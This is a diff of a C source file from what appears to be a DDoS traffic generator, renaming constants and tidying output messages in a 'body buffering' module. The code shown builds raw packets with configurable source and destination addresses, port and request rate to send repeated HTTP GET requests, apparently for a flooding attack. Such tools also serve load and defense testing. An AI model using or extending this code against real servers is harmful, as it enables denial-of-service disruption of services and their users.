@@ -5,8 +5,8 @@
 #include "base/time_check.h"
 #include "ddos/body_buffering.h"
 
-#define kGetFlooding_METHOD "kGetFlooding / HTTP/1.1\r\nHost: localhost\r\n\r\n"
-#define kBodyBuffering_BUFFERING_CNT 2000
+#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
+#define BODY_BUFFERING_CNT 2000
 
 extern int g_num_threads;
 
@@ -28,7 +28,7 @@ struct timespec g_bodybuf_now_time;
 void BodyBufferingPrintUsage(void)
 {
   printf(
-      "body buffering Usage : "
+      "Body Buffering Usage : "
       "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
   return;
 }
@@ -45,7 +45,7 @@ void *GenerateBodyBuffering(void *data)
     // *** begin of critical section ***
     pthread_mutex_lock(&g_bodybuf_mutex);
     GetMaskingArguments(&g_bodybuf_input, &g_bodybuf_now);
-    if (bodybuf_cnt % kBodyBuffering_BUFFERING_CNT == 0) {
+    if (bodybuf_cnt % BODY_BUFFERING_CNT == 0) {
       if (sock != -1) {
         close(sock);
       }
@@ -63,10 +63,10 @@ void *GenerateBodyBuffering(void *data)
           inet_addr(g_bodybuf_now.dest),
           src_port,
           g_bodybuf_now.port,
-          kGetFlooding_METHOD,
-          strlen(kGetFlooding_METHOD),
+          GET_METHOD,
+          strlen(GET_METHOD),
           seq, ack, 0);
-      seq += strlen(kGetFlooding_METHOD);
+      seq += strlen(GET_METHOD);
 
       bodybuf_cnt = 0;
     }
@@ -157,10 +157,9 @@ void BodyBufferingMain(char *argv[])
     pthread_join(threads[i], NULL);
     printf("threads %d joined\n", i);
   }
-  printf("Body Buffering attack finished.\n");
   pthread_mutex_destroy(&g_bodybuf_mutex);
   pthread_exit(NULL);
-  printf("kUdpFlooding flood finished\nTotal %lu packets sent.\n",
+  printf("Body Buffering finished\nTotal %lu packets sent.\n",
       g_bodybuf_num_total);
   return;
 }
